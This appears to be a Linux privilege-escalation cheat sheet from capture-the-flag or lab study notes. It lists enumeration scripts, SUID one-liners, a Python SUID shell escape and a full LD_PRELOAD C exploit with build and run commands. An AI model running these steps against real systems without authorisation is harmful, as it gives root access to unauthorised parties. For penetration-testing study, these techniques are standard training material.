# Becoming root

To escalate privileges you need to find vulnerabilities in the target system.
Find this with any of these scripts:

- `sudo -l`
- [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
- [linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)
- [linux-exploit-suggester](https://raw.githubusercontent.com/knarkzel/linux-exploit-suggester/master/linux-exploit-suggester.sh)

## Useful one liners

```bash
chmod u+s <FILE> # set SUID-bit
find / -type f -perm -04000 -ls 2>/dev/null # find SUID binaries
openssl passwd -1 -salt THM <PASSWORD> # hash password for /etc/passwd exploit
```

## Python binary

If you found a `python` binary with SUID, run following to become root:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## LD_PRELOAD

You can abuse LD_PRELOAD to become root if you can execute a binary
with SUID-bit and `gcc` is installed.

Open file and paste malicous C-code:

```bash
cd /tmp
nano shell.c
```

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Compile it as dynamic library and set `<BINARY>` to an executable with SUID:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=$PWD/shell.so <BINARY>
```

For more details, see [Dynamic linker tricks: Using LD_PRELOAD to cheat, inject features and investigate programs](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)